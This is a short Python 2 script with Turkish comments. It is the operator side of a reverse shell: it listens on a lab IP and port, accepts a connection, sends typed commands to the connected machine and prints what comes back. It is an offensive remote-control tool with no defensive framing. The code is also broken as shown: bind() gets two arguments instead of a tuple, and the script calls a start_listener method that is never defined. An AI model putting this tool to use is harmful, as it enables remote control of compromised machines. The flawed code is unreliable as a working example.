import socket

class SocketDinleyici:
    def __init__(self,ip,port):  #Bir fonksiyon ile surekli opsiyonel yapıyoruz
        dinleyici = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # dinleyici olusturma
        dinleyici.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # dinleyiciyi birden fazla kere kullanabilme
        dinleyici.bind(ip, port)  # ip ve kullandigimiz port
        dinleyici.listen(0)  # Dinlemeye basla
        print("Dinleniyor...!")
        (self.my_connetion, my_adress) = dinleyici.accept()  # Gelen baglantilar
        print("Baglanti tamam" + str(my_adress))

    def command_execution(self,command_input):
        self.my_connetion.send(command_input)  # aldigini yolla
        return self.my_connetion.recv(1024)

    def start_dineyici(self):
        while True:
            command_input = raw_input("Enter Command") #giris yap
            command_output =self.command_execution(command_input)
            print(command_output) #sonucu yazdir

my_socket_dinleyici = SocketDinleyici ("10.0.2.6",8080)
my_socket_dinleyici.start_listener()